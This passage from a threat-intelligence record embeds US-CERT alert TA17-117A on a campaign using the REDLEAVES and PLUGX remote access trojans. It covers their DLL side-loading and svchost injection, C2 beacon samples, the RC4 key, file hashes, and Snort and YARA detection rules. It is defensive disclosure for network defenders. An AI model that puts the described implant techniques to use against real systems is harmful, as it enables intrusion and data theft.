of domain administrators).</li><li>Use two-factor authentication (e.g., security tokens for remote access and to any sensitive data repositories);</li><li>If soft tokens are used, they should not exist on the same device that is requesting remote access (laptop), and instead should be on a telephone or other out-of-band device.</li><li>Create privileged role tracking;<ul style=\"list-style-type: circle;\"><li>Create a change control process to all privilege escalations and role changes on user accounts;</li><li>Enable alerts on privilege escalations and role changes; and</li><li>Log privileged user changes in the environment and alert on unusual events.</li></ul></li><li>Establish least privilege controls; and</li><li>Implement a security-awareness training program.</li></ul><h4>Best Practices</h4><ul><li>Implement a vulnerability assessment and remediation program.</li><li>Encrypt all sensitive data in transit and at rest.</li><li>Create an insider threat program.</li><li>Assign additional personnel to review logging and alerting data.</li><li>Complete independent security (not compliance) audit.</li><li>Create an information sharing program.</li><li>Complete and maintain network and system documentation to aid in timely incident response, including:<ul style=\"list-style-type: circle;\"><li>network diagrams,</li><li>asset owners,</li><li>type of asset, and</li><li>an up-to-date incident response plan.</li></ul></li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"\">PaloAltoNetworks: “menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations” </a></li>\n\t\t\t\t\t<li><a href=\"\">FireEye: “APT10 (Menupass Team) Renews Operations Focused on Nordic Private Industry; operations Extend to Global Partners”. Feb</a></li>\n\t\t\t\t\t<li><a href=\"\">CyLance: “The Deception Project: A New Japanese-Centric Threat” </a></li>\n\t\t\t\t\t<li><a href=\"\">PwC/BAE Systems: “Operation Cloud Hopper: Exposing a systematic hacking operation with an unprecedented web of global victims: A</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html\">JPCERT/CC: “RedLeaves-Malware Based on Open Source Rat” </a></li>\n\t\t\t\t\t<li><a href=\"\">NCC Group: “RedLeaves Implant-Overview” </a></li>\n\t\t\t\t\t<li><a href=\"\">National Cyber Security Centre: “Infrastructure Update Version 1.0\" Reference: March 17, 2017”</a></li>\n\t\t\t\t\t<li><a href=\"\">FireEye: “BUGJUICE Malware Profile”. April 05, 2017 11:45:00 AM, 17-00003261, Version: 1</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.jpcert.or.jp/2017/02/chches-malware--93d6.html\">JPCERT/CC: “ChChes- Malware that Communicates with C&amp;C Servers Using Cookie Headers” </a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>April 27, 2017: Initial post</li>\n\t\t\t\t\t\t<li>April 28, 2017: Updated guidance under the sub-section: Network Infrastructure Recommendations</li>\n\t\t\t\t\t\t<li>May 2, 2017: In table 11, fixed trailing quote on date</li>\n\t\t\t\t\t\t<li>May 11, 2017: STIX and XLSX package was updated</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "8841 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-117A",
					"source_name": "open source",
					"description": "Original release date: April 27, 2017 | Last revised: May 14, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Networked Systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>The National Cybersecurity and Communications Integration Center (NCCIC) has become aware of an emerging sophisticated campaign, occurring since at least May 2016, that uses multiple malware implants. Initial victims have been identified in several sectors, including Information Technology, Energy, Healthcare and Public Health, Communications, and Critical Manufacturing.</p><p>According to preliminary analysis, threat actors appear to be leveraging stolen administrative credentials (local and domain) and certificates, along with placing sophisticated malware implants on critical systems. Some of the campaign victims have been IT service providers, where credential compromises could potentially be leveraged to access customer environments. Depending on the defensive mitigations in place, the threat actor could possibly gain full access to networks and data in a way that appears legitimate to existing monitoring tools.</p><p>Although this activity is still under investigation, NCCIC is sharing this information to provide organizations information for the detection of potential compromises within their organizations.</p><p>NCCIC will update this document as information becomes available.</p><p>For a downloadable copy of this report and listings of IOCs, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/IR-ALERT-MED-17-093-01C-Intrusions_Affecting_Multiple_Victims_Across_Multiple_Sectors.pdf\">Report (.pdf)</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/IR-ALERT-MED-17-093-01C.xlsx\">IOCs (.xlsx)</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/IR-ALERT-MED-17-093-01-C.XML\">IOCs (STIX)</a></li></ul><p>To report activity related to this Incident Report Alert, please contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 1-888-282-0870.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<h3>Risk Evaluation</h3><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 19px;\"><p align=\"center\"><strong>NCCIC Cyber Incident Scoring System (NCISS) Rating Priority Level (Color) </strong></p></td></tr><tr><td style=\"width: 100%; height: 19px;\"><p>Yellow (Medium)</p></td></tr><tr><td style=\"width: 100%; height: 10px;\"><p>A medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.</p></td></tr></tbody></table><h3>Details</h3><p>While NCCIC continues to work with a variety of victims across different sectors, the adversaries in this campaign continue to affect several IT service providers. To achieve operational efficiencies and effectiveness, many IT service providers often leverage common core infrastructure that should be logically isolated to support multiple clients.</p><p>Intrusions into these providers create opportunities for the adversary to leverage stolen credentials to access customer environments within the provider network.</p><p><img align=\"middle\" alt=\"Figure 1: Structure of a traditional business network and an IT service provider network\" src=\"https://www.us-cert.gov/sites/default/files/publications/IT%20service%20provider%20network.png\" style=\"width: 631px; height: 402px;\" /></p><p><em>Figure 1: Structure of a traditional business network and an IT service provider network</em></p><h3>Technical Analysis</h3><p>The threat actors in this campaign have been observed employing a variety of tactics, techniques, and procedures (TTPs). The actors use malware implants to acquire legitimate credentials then leverage those credentials to pivot throughout the local environment. NCCIC is aware of several compromises involving the exploitation of system administrators’ credentials to access trusted domains as well as the malicious use of certificates. Additionally, the adversary makes heavy use of PowerShell and the open source PowerSploit tool to enable assessment, reconnaissance, and lateral movement.</p><p>Command and Control (C2) primarily occurs using RC4 cipher communications over port 443 to domains that change IP addresses. Many of these domains spoof legitimate sites and content, with a particular focus on spoofing Windows update sites. Most of the known domains leverage dynamic DNS services, and this pattern adds to the complexity of tracking this activity. Listings of observed domains are found in this document’s associated STIX package and .xlsx file. The indicators should be used to observe potential malicious activity on your network.</p><p>User impersonation via compromised credentials is the primary mechanism used by the adversary. However, a secondary technique to maintain persistence and provide additional access into the victim network is the use of malware implants left behind on key relay and staging machines. In some instances, the malware has only been found within memory with no on-disk evidence available for examination. To date, the actors have deployed multiple malware families and variants, some of which are currently not detected by anti-virus signatures. The observed malware includes PLUGX/SOGU and REDLEAVES. Although the observed malware is based on existing malware code, the actors have modified it to improve effectiveness and avoid detection by existing signatures.</p><p>Both REDLEAVES and PLUGX have been observed being executed on systems via dynamic-link library (DLL) side-loading. The DLL side-loading technique utilized by these malware families typically involves three files: a non-malicious executable, a malicious DLL loader, and an encoded payload file. The malicious DLL is named as one of the DLLs that the executable would normally load and is responsible for decoding and executing the payload into memory.</p><h3>REDLEAVES Malware</h3><p>The most unique implant observed in this campaign is the REDLEAVES malware. The REDLEAVES implant consists of three parts: an executable, a loader, and the implant shellcode. The REDLEAVES implant is a remote administration Trojan (RAT) that is built in Visual C++ and makes heavy use of thread generation during its execution. The implant contains a number of functions typical of RATs, including system enumeration and creating a remote shell back to the C2.</p><h4>Capabilities</h4><p><strong>System Enumeration</strong>. The implant is capable of enumerating the following information about the victim system and passing it back to the C2:</p><ul><li>system name,</li><li>system architecture (x86 or x64),</li><li>operating system major and minor versions,</li><li>amount of available memory,</li><li>processor specifications,</li><li>language of the user,</li><li>privileges of the current process,</li><li>group permissions of the current user,</li><li>system uptime,</li><li>IP address, and</li><li>primary drive storage utilization.</li></ul><p><strong>Command Execution.</strong> The implant can execute a command directly inside a command shell using native Windows functionality by passing the command to run to cmd.exe with the “/c” option (“cmd.exe /c &lt;command&gt;”).</p><p><strong>Command Window Generation.</strong> The implant can also execute commands via a remote shell that is generated and passed through a named pipe. A command window is piped back to the C2 over the network as a remote shell or alternatively to another process or thread that can communicate with that pipe. The implant uses the mutexRedLeavesCMDSimulatorMutex.</p><p><strong>File System Enumeration.</strong> The implant has the ability to enumerate data within a specified directory, where it gathers filenames, last file write times, and file sizes.</p><p><strong>Network Traffic Compression and Encryption.</strong> The implant uses a form of LZO compression to compress data that is sent to its C2. After compression, the data for this implant sample is then RC4-ciphered with the key 0x6A6F686E3132333400 (this corresponds to the string “john1234” with the null byte appended).</p><p>Network Communications REDLEAVES connects to the C2 over TCP port 443, but does not use the secure flag when calling the API function InternetOpenUrlW. The data is not encrypted and there is no SSL handshake as would normally occur with port 443 traffic, but rather the data is transmitted in the form that is generated by the RC4 cipher.</p><p>Current REDLEAVES samples that have been examined have a hard-coded C2. Inside the implant’s configuration block in memory were the strings in Table 1.</p><div style=\"clear: both;\"><em>Table 1: REDLEAVES Sample Strings Found in C2</em></div><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p><code>QN4869MD ­­– mutex used to determine if the implant is already running (Varies from sample to sample)</code></p><p><code>2016-5-1-INCO –Unknown</code></p><p><code>%windir.\\system32\\svchost.exe - process that the implant was injected into</code></p><p><code>john1234 (with the null byte afterward) – RC4 Key</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p>While the name of the initial mutex, QN4869MD in this sample, varies among REDLEAVES samples, the RedLeavesCMDSimulatorMutex mutex name appears to be consistent. Table 2 contains a sample of the implant communications to the domain windowsupdates.dnset[.]com over TCP port 443.</p><p><em>Table 2: REDLEAVES Sample Beacon</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 232px;\"><p><code>--- BEGIN SAMPLE BEACON ---</code></p><p><code>00000000 c1 0c 00 00 7a 8d 9b dc 88 00 00 00 ....z... ....</code></p><p><code>0000000C 14 6f 68 6e 16 6f 68 6e c4 a4 b1 d1 c4 e6 24 eb .ohn.ohn ......$.</code></p><p><code>0000001C cf 49 81 a7 a1 c7 96 ff 6d 31 b4 48 8b 3e a3 c1 .I...... m1.H.&gt;..</code></p><p><code>0000002C 92 e2 c3 7c e4 4c cf e9 e1 fa fb 6a fa 66 2c bf ...|.L.. ...j.f,.</code></p><p><code>0000004C 7b 13 a7 30 17 3d eb fb d3 16 0e 96 83 21 2e 73 {..0.=.. .....!.s</code></p><p><code>0000005C dc 44 a2 72 fb f4 5e d0 4d b7 85 be 33 cd 13 21 .D.r..^. M...3..!</code></p><p><code>0000006C 3f e2 63 da da 5b 5e 52 9a 9c 20 36 69 cb cd 79 ?.c..[^R .. 6i..y</code></p><p><code>0000007C 13 79 7a d4 ed 63 b7 41 5d 38 b4 c2 84 74 98 cd .yz..c.A ]8...t..</code></p><p><code>0000008C f8 32 49 ef 2d e7 f2 ed .2I.-...</code></p><p><code>0000003C 5e 4b 72 6a f9 47 86 cd f1 cd 6d b5 24 79 3c 59 ^Krj.G.. ..m.$y</code></p><p><code>--- END SAMPLE BEACON ---</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><p>REDLEAVES network traffic has two 12-byte fixed-length headers in front of each RC4-encrypted compressed payload. The first header comes in its own packet, with the second header and the payload following in a separate packet within the same TCP stream. The last four bytes of the first header contain the number of the remaining bytes in little-endian format (0x88 in the sample beacon above).</p><p>The second header, starting at position 0x0C, is XOR’d with the first four bytes of the key that is used to encrypt the payload. In the case of this sample, those first four bytes would be “john” (or 0x6a6f686e using the ASCII hex codes). After the XOR operation, the bytes in positions 0x0C through 0x0F contain the length of the decrypted and decompressed payload. The bytes in positions 0x10 through 0x13 contain the length of the encrypted and compressed payload.</p><p>To demonstrate, in the sample beacon, the second header follows:</p><p>0000000C 14 6f 68 6e 16 6f 68 6e c4 a4 b1 d1</p><p>The length of the decrypted and decompressed payload is 0x7e000000 in little-endian format (0x146f686e XOR 0x6a6f686e). The length of the encrypted and compressed payload is 0x7c000000 in little-endian (0x166f686e XOR 0x6a6f686e). This is verified by referring back to the sample beacon which had the number of remaining bytes set to 0x88 and subtracting the length of the second header (0x88 – 0xC = 0x7c).</p><h4>Strings</h4><p><em>Note: Use caution when searching based on strings, as common strings may cause a large number of false positives.</em></p><p><em>Table 3: Strings Appearing in the Analyzed Sample of REDLEAVES</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 49px;\"><p><code>[ Unique Ascii strings ] --------------------</code></p><p><code>red_autumnal_leaves_dllmain.dll</code></p><p><code>windowsupdates.dnset.com windowsupdates.dnset.com</code></p><p><code>windowsupdates.dnset.com</code></p><p><code>2016-5-10-INCO</code></p><p><code>john1234</code></p><p><code>Feb 04 2015</code></p><p><code>127.0.0.1 169.254</code></p><p><code>tcp</code></p><p><code>https</code></p><p><code>http</code></p><p><code>[ Unique Unicode strings ] ------------------</code></p><p><code>RedLeavesCMDSimulatorMutex</code></p><p><code>QN4869MD</code></p><p><code>\\\\\\\\.\\\\pipe\\\\NamePipe_MoreWindows</code></p><p><code>network.proxy.type</code></p><p><code>network.proxy.http_port</code></p><p><code>network.proxy.http network.proxy.autoconfig_url</code></p><p><code>network.proxy.</code></p><p><code>a([a-zA-Z0-9])</code></p><p><code>b([ \\\\t])</code></p><p><code>c([a-zA-Z])</code></p><p><code>d([0-9])</code></p><p><code>h([0-9a-fA-F])</code></p><p><code>n(\\r|(\\r?\\n)) q(\\\"[^\\\"]*\\\")|('[^']*')</code></p><p><code>w([a-zA-Z]+)</code></p><p><code>z([0-9]+)</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>Malware Execution Analysis</h4><p><strong>File Name: VeetlePlayer.exe</strong></p><p><strong>MD5</strong>: 9d0da088d2bb135611b5450554c99672</p><p><strong>File Size</strong>: 25704 bytes (25.1 KB)</p><p><strong>Description</strong>: This is the executable that calls the exports located within libvlc.dll</p><p> </p><p><strong>File Name: libvlc.dll</strong></p><p><strong>MD5</strong>: 9A8C76271210324D97A232974CA0A6A3</p><p><strong>File Size</strong>: 33792 bytes (33.0 KB)</p><p><strong>Description</strong>: This is the loader and decoder for mtcReport.ktc, the combined shellcode and implant file.</p><p> </p><p><strong>File Name: mtcReport.ktc</strong></p><p><strong>MD5</strong>: 3045E77E1E9CF9D9657AEA71AB5E8947</p><p><strong>File Size</strong>: 231076 bytes (225.7 KB)</p><p><strong>Description</strong>: This is the encoded shellcode and implant file. When this file is decoded, the shellcode precedes the actual implant, which resides at offset 0x1292 from the beginning of the shellcode in memory. The implant has the MZ and PE flags replaced with the value 0xFF.</p><p> </p><p>All three of these files must be present for execution of the malware to succeed.</p><p>When all files are present and the VeetlePlayer.exe file is executed, it will make calls to the following DLL exports within the libvlc.dll file:</p><ul><li>VLC_Version checks to see if its calling file is named “VeetlePlayer.exe”. If the calling file is named something else, execution will terminate and no shellcode will be loaded.</li><li>VLC_Create reads in the contents of the file mtcReport.ktc.</li><li>VLC_Init takes in the offset in which the encoded shellcode/implant file is located and deobfuscates it. After deobfuscation, this export executes the shellcode.</li><li>VLC_Destroy does nothing other than perform a return 0.</li><li>VLC_AddIntf and VLC_CleanUp simply call the export VLC_Destroy, which returns 0.</li></ul><p>When the libvlc.dll decodes the shellcode/implant, it calls the shellcode at the beginning of the data blob in memory. The shellcode then activates a new instance of svchost.exe and suspends it. It then makes a call to WriteProcessMemory() and inserts the implant with the damaged MZ and PE headers into its memory space. It then resumes execution of svchost.exe, which runs the implant.</p><p>The resulting decoded shellcode with the implant file below it can have a variable MD5 based on how it is dumped from memory. The MD5 checksums of two instances of decoded shellcode are:</p><ol><li>ba4b4087370780dc988d55cbb9de885d</li><li>3d032ba5f73cbc398f1a77af92077cd8</li></ol><p>Table 4 contains the implant resulting from the original implant’s separation from the shellcode and the repair of its MZ and PE flags.</p><p><em>Table 4: Resulting Implant from Shellcode Separation</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 142px;\"><p><code><strong>File Name</strong>: red_autumnal_leaves_dllmain.dll</code></p><p><code><strong>MD5</strong>: 3EBBFEEE3A832C92BB60B531F749230E</code></p><p><code><strong>File Size</strong>: 226304 bytes (221.0 KB)</code></p><p><code><strong>PE Compile Date</strong>: 10 May 2016</code></p><p><code>During execution, the file will create two mutexes called RedLeavesCMDSimulatorMutex and QN4869MD. It checks the QN4869MD mutex to see if it is already running. It will then perform initial enumeration of the system to include operating system versions, number of processors, RAM, and CPU information.</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>PLUGX</h4><p>PLUGX is a sophisticated Remote Access Tool (RAT) operating since approximately 2012. Although there are now many variants of this RAT in existence today, there are still characteristics common to most variants.</p><p>Typically, PLUGX uses three components to install itself.</p><ol><li>A non-malicious executable</li><li>A malicious DLL/installer</li><li>An encoded payload – the PLUGX RAT.</li></ol><p>A non-malicious executable with one or more imports is used to start the installation process. The executable will likely exist in a directory not normally associated with its use. In some cases, the actor may use an executable signed with a valid certificate, and rename the DLL and encoded payload with file names that suggest they are related to the trusted file. Importantly, the actor seems to vary the encoding scheme used to protect the encoded payload to stifle techniques used by AV vendors to develop patterns to detect it. The payload is either encoded with a single byte or encrypted and decompressed. Recently, NCCIC has observed a case where the encoded payload contains a decoding stub within itself, beginning at byte zero. The malware simply reads this payload and executes it starting at byte zero. The stub then decodes and executes the rest of itself in memory. Notably, this stub varies in its structure and algorithm, again stifling detection by signature based security software. The PLUGX malware is never stored on disk in an unencrypted or decoded format.</p><p>When the initial executable is launched, the imported library, usually a separate DLL, is replaced with a malicious version that in turn decodes and installs the third and final component, which is the PLUGX rat itself. Typically, the PLUGX component is obfuscated and contains no visible executable code until it is unpacked in memory, protecting it from AV/YARA scans while static. During the evolution of these PLUGX compromises, NCCIC noted an increasing implementation of protections of the actual decoded PLUGX in memory. For example, the most recent version we looked at implements a secure strings method, which hides the majority of the common commands used by PLUGX. This is an additional feature designed to thwart signature based security tools.</p><p>Once the PLUGX RAT is installed on the victim, the actors has complete C2 capabilities of the victim system, including the ability to take screenshots and download files from the compromised system. The communications between the RAT (installed on the victim system) and the PLUGX C2 server are encoded to secure the communication and stifle detection by signature based network signature tools.</p><p>The advanced capabilities of PLUGX are implemented via a plugin framework. Each plugin operates independently in its own unique thread within the service. The modules may vary based on variants. Table 5 lists the modules and capabilities contained within one sample recently analyzed by NCCIC.</p><p><em>Table 5: Modules and Capabilities of PLUGX</em></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><thead><tr><th style=\"width: 132px;\"><p><strong>Module Name</strong></p></th><th style=\"width: 499px;\"><p><strong>Capability</strong></p></th></tr></thead><tbody><tr><td style=\"width: 132px;\"><p>Disk</p></td><td style=\"width: 499px;\"><p>wide range of system-related capabilities including file / directory / drive enumeration, file / directory creation, create process, and obtain environment variables</p></td></tr><tr><td style=\"width: 132px;\"><p>Keylog</p></td><td style=\"width: 499px;\"><p>logs keystrokes and saves data to log file</p></td></tr><tr><td style=\"width: 132px;\"><p>Nethood</p></td><td style=\"width: 499px;\"><p>enumerates the host's network resources via the Windows multiple provider router DLL</p></td></tr><tr><td style=\"width: 132px;\"><p>Netstat</p></td><td style=\"width: 499px;\"><p>set the state of a TCP connection or obtain the extended TCP or UDP tables (lists of network endpoints available to a process) of each active process on the host</p></td></tr><tr><td style=\"width: 132px;\"><p>Option</p></td><td style=\"width: 499px;\"><p>provides the ability to initiate a system shutdown, adjust shutdown-related privileges for a given process, and lock the user's workstation</p></td></tr><tr><td style=\"width: 132px;\"><p>Portmap</p></td><td style=\"width: 499px;\"><p>port mapping</p></td></tr><tr><td style=\"width: 132px;\"><p>Process</p></td><td style=\"width: 499px;\"><p>process enumeration, termination, and capability to obtain more in-depth information pertaining to each process (e.g. CompanyName, FileDescription, FileVersion of each module loaded by the process)</p></td></tr><tr><td style=\"width: 132px;\"><p>Regedit</p></td><td style=\"width: 499px;\"><p>create, read, update &amp; delete registry entries</p></td></tr><tr><td style=\"width: 132px;\"><p>Screen</p></td><td style=\"width: 499px;\"><p>capability to capture screenshots of the system</p></td></tr><tr><td style=\"width: 132px;\"><p>Service</p></td><td style=\"width: 499px;\"><p>start, stop, remove, configure &amp; query services</p></td></tr><tr><td style=\"width: 132px;\"><p>Shell</p></td><td style=\"width: 499px;\"><p>remote shell access</p></td></tr><tr><td style=\"width: 132px;\"><p>SQL</p></td><td style=\"width: 499px;\"><p>enumerate SQL databases and available drivers; execute SQL queries</p></td></tr><tr><td style=\"width: 132px;\"><p>Telnet</p></td><td style=\"width: 499px;\"><p>provides a telnet interface</p></td></tr></tbody></table><p>The PLUGX operator may dynamically add, remove, or update PLUGX plugins during runtime. This provides the ability to dynamically adjust C2 capabilities based on the requirements of the C2 operator.</p><p>Network activity is often seen as POST requests similar to that shown in table 6. Network defenders can look to detect non-SSL HTTP traffic on port 443, which can be indicative of malware traffic. The PLUGX malware is also seen using TCP ports 80, 8080, and 53.</p><p><em>Table 6: Sample PLUGX Beacon</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 229px;\"><div><code>POST /D15DB9E25ADA34EC9E559736 HTTP/1.1          </code></div><div><code>Accept:             */*</code></div><div><code>HX1:     0</code></div><div><code>HX2:     0</code></div><div><code>HX3:     61456</code></div><div><code>HX4:     1</code></div><div><code>User-Agent:       Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)</code></div><div><code>Host:    sc.weboot.info:443</code></div><div><code>Content-Length:             0</code></div><div><code>Cache-Control: no-cache</code></div></td></tr></tbody></table><p>Even though the beacon went to port 443, which is commonly used for encrypted HTTP communications, this traffic was plaintext HTTP, as is common for this variant of PLUGX.</p><h4>For IT Service Providers</h4><p>All organizations that provide IT services as a commodity for other organizations should evaluate their infrastructure to determine if related activity has taken place. Active monitoring of network traffic for the indicators of compromise (IOCs) provided in this report, as well as behavior analysis for similar activity, should be conducted to identify C2 traffic. In addition, frequency analysis should be conducted at the lowest level possible to determine any unusual fluctuation in bandwidth indicative of a potential data exfiltration. Both management and client systems should be evaluated for host indicators provided. If an intrusion is suspected, please reach out to the NCCIC at the contact information provided at the end of this report.</p><h4>For Private Organizations and Government Agencies</h4><p>All organizations should include the IOCs provided in their normal intrusion detection systems for continual analysis. Organizations that determine their risk to be elevated due to alignment to the sectors being targeted, unusual detected activity, or other factors, should conduct a dedicated investigation to identify any related activity. Organizations which leverage external IT service providers should validate with their providers that due diligence is being conducted to validate if there are security concerns with their specific provider. If an intrusion is suspected, please reach out to the NCCIC at the contact information provided at the end of this report.<a name=\"3_1_U__FOUO__Implant_Capabilities\" id=\"3_1_U__FOUO__Implant_Capabilities\"></a></p><h4>Detection</h4><p>NCCIC is providing a compilation of IOCs from a variety of sources to aid in the detection of this malware. The IOCs provided in the associated STIX package and .xlsx file were derived from various government, commercial, and publically available sources. The sources provided does not constitute an exhaustive list and the U.S. Government does not endorse or support any particular product or vendor’s information listed in this report. However, NCCIC includes this compilation here to ensure the distribution of the most comprehensive information. This alert will be updated as additional details become available.</p><p><em>Table 7: Sources Referenced</em></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 132px;\"><p><strong>Source </strong></p></td><td style=\"width: 499px;\"><p><strong>Title</strong></p></td></tr><tr><td style=\"width: 132px;\"><p>PaloAltoNetworks</p></td><td style=\"width: 499px;\"><p>“menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations”</p></td></tr><tr><td style=\"width: 132px;\"><p>FireEye</p></td><td style=\"width: 499px;\"><p>“APT10 (Menupass Team) Renews Operations Focused on Nordic Private Industry; operations Extend to Global Partners”. February 23, 2017 10:14:00 AM,17-00001858, Version: 2</p></td></tr><tr><td style=\"width: 132px;\"><p>CyLance</p></td><td style=\"width: 499px;\"><p>“The Deception Project: A New Japanese-Centric Threat”</p></td></tr><tr><td style=\"width: 132px;\"><p>PwC/BAE Systems</p></td><td style=\"width: 499px;\"><p>“Operation Cloud Hopper: Exposing a systematic hacking operation with an</p><p>unprecedented web of global victims: April 2017”</p></td></tr><tr><td style=\"width: 132px;\"><p>JPCERT/CC</p></td><td style=\"width: 499px;\"><p>“RedLeaves-Malware Based on Open Source Rat”</p><p><a href=\"http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html\">http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html</a></p></td></tr><tr><td style=\"width: 132px;\"><p>NCC Group</p></td><td style=\"width: 499px;\"><p>“RedLeaves Implant-Overview”</p></td></tr><tr><td style=\"width: 132px;\"><p>National Cyber Security Centre</p></td><td style=\"width: 499px;\"><p>“Infrastructure Update Version 1.0” Reference: March 17, 2017</p></td></tr><tr><td style=\"width: 132px;\"><p>FireEye</p></td><td style=\"width: 499px;\"><p>“BUGJUICE Malware Profile”. April 05, 2017 11:45:00 AM, 17-00003261, Version: 1</p></td></tr><tr><td style=\"width: 132px;\"><p>JPCERT/CC</p></td><td style=\"width: 499px;\"><p>“ChChes- Malware that Communicates with C&amp;C Servers Using Cookie Headers”</p><p><a href=\"http://blog.jpcert.or.jp/2017/02/chches-malware--93d6.html\">http://blog.jpcert.or.jp/2017/02/chches-malware--93d6.html</a></p></td></tr></tbody></table><p>NCCIC recommends monitoring activity to the following domains and IP addresses, and scanning for evidence of the file hashes as potential indicators of infection. Some of the IOCs provided may be associated with legitimate traffic. Nevertheless, closer evaluation is warranted if the IOCs are observed. If these IOCs are found, NCCIC can provide additional assistance in further investigations. A comprehensive listing of IOCs can be found in the associated STIX package and .xlsx file.</p><h4>Network Signatures</h4><p><em>Table 8: REDLEAVES Network Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 46px;\"><p> <code>alert tcp any any -&gt; any any (msg: \"REDLEAVES Implant\"; content: \"|00 00 7a 8d 9b dc|\"; offset: 2; depth: 6; content: \"|00 00|\"; offset: 10; depth: 2; sid: 314;)</code></p><p> </p><p><code>alert tcp any -&gt; any any (msg:”Suspicious PLUGX URI String”; content:”POST”; http_method; content:”/update?id=”; http_uri; fast_pattern:only; pcre:”/update\\?id=[a-fA-F0-9]{8} HTTP/”; sid:101;)</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><p><em>Table 9: REDLEAVES YARA Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule Dropper_DeploysMalwareViaSideLoading {</code></p><p><code>    meta:</code></p><p><code>            description = \"Detect a dropper used to deploy an implant via side loading. This dropper has specifically been observed deploying REDLEAVES &amp; PlugX\"</code></p><p><code>            author = \"USG\"</code></p><p><code>            true_positive = \"5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481: drops REDLEAVES. 6392e0701a77ea25354b1f40f5b867a35c0142abde785a66b83c9c8d2c14c0c3: drops plugx. \"</code></p><p><code>    strings:        </code></p><p><code>            $UniqueString = {2e 6c 6e 6b [0-14] 61 76 70 75 69 2e 65 78 65} // \".lnk\" near \"avpui.exe\"</code></p><p><code>            $PsuedoRandomStringGenerator = {b9 1a [0-6] f7 f9 46 80 c2 41 88 54 35 8b 83 fe 64} // Unique function that generates a 100 character pseudo random string.</code></p><p><code>    condition:</code></p><p><code>            any of them</code></p><p><code>}</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule REDLEAVES_DroppedFile_ImplantLoader_Starburn {</code></p><p><code>    meta:</code></p><p><code>            description = \"Detect the DLL responsible for loading and deobfuscating the DAT file containing shellcode and core REDLEAVES RAT\"</code></p><p><code>            author = \"USG\"</code></p><p><code>            true_positive = \"7f8a867a8302fe58039a6db254d335ae\" // StarBurn.dll</code></p><p><code>    strings:</code></p><p><code>            $XOR_Loop = {32 0c 3a 83 c2 02 88 0e 83 fa 08 [4-14] 32 0c 3a 83 c2 02 88 0e 83 fa 10} // Deobfuscation loop</code></p><p><code>    condition:</code></p><p><code>            any of them</code></p><p><code>}</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule REDLEAVES_DroppedFile_ObfuscatedShellcodeAndRAT_handkerchief {</code></p><p><code>    meta:</code></p><p><code>        description = \"Detect obfuscated .dat file containing shellcode and core REDLEAVES RAT\"</code></p><p><code>        author = \"USG\"</code></p><p><code>        true_positive = \"fb0c714cd2ebdcc6f33817abe7813c36\" // handkerchief.dat</code></p><p><code>    strings:</code></p><p><code>        $RedleavesStringObfu 